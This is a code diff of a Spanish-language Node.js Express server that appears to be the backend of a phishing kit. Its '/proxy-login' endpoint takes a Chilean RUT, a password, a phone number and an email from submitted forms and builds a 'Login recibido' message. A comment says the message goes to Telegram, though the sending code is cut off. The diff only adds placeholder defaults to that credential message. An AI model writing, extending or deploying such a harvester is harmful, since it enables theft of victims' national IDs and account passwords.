@@ -63,12 +63,12 @@ app.post("/autorizar", async (req, res) => {
 // Endpoint para login → enviar credenciales o correo a Telegram
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, telefono, mail } = req.body;
-  let mensaje = "";
+  let mensaje;
 
   if (mail) {
-    mensaje = `Correo actualizado:\n${mail}`;
+    mensaje = `Correo actualizado:\n${mail || "(sin correo)"}`;
   } else {
-    mensaje = `Login recibido:\nRUT: ${rut}\nClave: ${passwd}\nTeléfono: ${telefono}`;
+    mensaje = `Login recibido:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nTeléfono: ${telefono || "(sin teléfono)"}`;
   }
 
   try {
